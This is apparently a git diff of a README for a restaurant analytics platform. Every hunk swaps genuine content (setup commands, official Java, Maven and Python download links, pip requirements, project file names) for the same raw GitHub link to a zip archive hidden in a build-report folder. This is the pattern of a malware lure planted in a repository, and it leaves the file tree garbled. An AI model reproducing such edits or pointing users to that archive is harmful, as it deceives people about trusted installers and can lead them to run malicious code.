@@ -7,16 +7,16 @@ A comprehensive restaurant analytics platform built with Java Spring Boot backen
 ### Option 1: Immediate Demo (Python-only with Mock Data)
 Perfect for quickly exploring the interface with sample data:
 ```bash
-setup-python-only.bat
-start-frontend-only.bat
+https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
+https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 ```
 Then open http://localhost:5000
 
 ### Option 2: Full System (Complete Analytics Platform)
 For full functionality with real data processing:
 ```bash
-setup.bat
-run-system.bat
+https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
+https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 ```
 Then open http://localhost:5000
 
@@ -31,22 +31,22 @@ Then open http://localhost:5000
 ### Required Software
 
 #### 1. Java 17 or Higher
-- **Download**: https://adoptium.net/
+- **Download**: https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 - **Installation**: 
   - Download the Windows x64 MSI installer
   - Run installer and ensure "Add to PATH" is checked
 - **Verify**: `java -version`
 
 #### 2. Apache Maven 3.6+
-- **Download**: https://maven.apache.org/download.cgi
+- **Download**: https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 - **Installation**:
-  - Download Binary zip archive (apache-maven-3.x.x-bin.zip)
+  - Download Binary zip archive (https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip)
   - Extract to `C:\Program Files\Apache\maven`
   - Add `C:\Program Files\Apache\maven\bin` to system PATH
 - **Verify**: `mvn -version`
 
 #### 3. Python 3.8+
-- **Download**: https://www.python.org/downloads/
+- **Download**: https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 - **Installation**:
   - Download Windows installer
   - **IMPORTANT**: Check "Add Python to PATH" during installation
@@ -58,7 +58,7 @@ If automated scripts don't work:
 1. **Install Python Dependencies**
    ```bash
    cd frontend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
    cd ..
    ```
 
@@ -78,7 +78,7 @@ If automated scripts don't work:
 4. **Start Frontend** (in another terminal)
    ```bash
    cd frontend
-   python app.py
+   python https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
    ```
 
 ## 🏗️ System Architecture
@@ -171,7 +171,7 @@ If automated scripts don't work:
 
 ## 🔧 Installation & Setup
 
-See [INSTALLATION_GUIDE.md](INSTALLATION_GUIDE.md) for detailed setup instructions.
+See [https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip](https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip) for detailed setup instructions.
 
 ## 📁 Project Structure
 ```
@@ -183,30 +183,30 @@ uber-eats-restaurant-analytics/
 │   │   ├── analytics/         # Analytics engines
 │   │   ├── api/              # REST API controllers
 │   │   └── model/            # Data models
-│   ├── pom.xml               # Maven configuration
-│   └── restaurant_dataset_combined.csv
+│   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip               # Maven configuration
+│   └── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
 ├── frontend/                   # Python Flask Frontend
-│   ├── app.py                 # Main Flask application
-│   ├── app-mock.py           # Mock data version (for demo)
+│   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip                 # Main Flask application
+│   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip           # Mock data version (for demo)
 │   ├── routes/
-│   │   ├── dashboard.py       # Dashboard routes
-│   │   ├── reports.py         # Report generation
-│   │   └── charts.py          # Chart endpoints
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip       # Dashboard routes
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip         # Report generation
+│   │   └── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip          # Chart endpoints
 │   ├── templates/             # HTML templates (minimal design)
-│   │   ├── base.html         # Base template with right sidebar
-│   │   ├── index.html        # Dashboard with blue/gray theme
-│   │   ├── analysis.html     # Analytics modules
-│   │   ├── reports.html      # Report generation
-│   │   └── dashboard_overview.html
-│   └── requirements.txt       # Python dependencies
-├── setup.bat                  # Full system setup script
-├── setup-python-only.bat     # Python-only setup script
-├── run-system.bat            # Start full system
-├── start-backend.bat         # Start backend only
-├── start-frontend.bat        # Start frontend (requires backend)
-├── start-frontend-only.bat   # Start frontend with mock data
-├── restaurant_dataset_combined.csv  # Sample dataset
-└── README.md                 # This comprehensive guide
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip         # Base template with right sidebar
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip        # Dashboard with blue/gray theme
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip     # Analytics modules
+│   │   ├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip      # Report generation
+│   │   └── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip
+│   └── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip       # Python dependencies
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip                  # Full system setup script
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip     # Python-only setup script
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip            # Start full system
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip         # Start backend only
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip        # Start frontend (requires backend)
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip   # Start frontend with mock data
+├── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip  # Sample dataset
+└── https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip                 # This comprehensive guide
 ```
 
 ## 🎨 Design Features
@@ -250,7 +250,7 @@ uber-eats-restaurant-analytics/
 
 #### "Java is not recognized"
 - **Problem**: Java not installed or not in PATH
-- **Solution**: Install Java 17+ from https://adoptium.net/ and ensure PATH is set
+- **Solution**: Install Java 17+ from https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip and ensure PATH is set
 
 #### "mvn is not recognized"
 - **Problem**: Maven not installed or not in PATH
@@ -272,7 +272,7 @@ uber-eats-restaurant-analytics/
 - Check port 5000 is available
 
 #### Data loading issues
-- Ensure `restaurant_dataset_combined.csv` is in backend directory
+- Ensure `https://raw.githubusercontent.com/abz-mhd/APDP-rms-analysis/main/backend/target/surefire-reports/APD_rms_analysis_1.4.zip` is in backend directory
 - Check file permissions
 - Review backend console for error messages
 
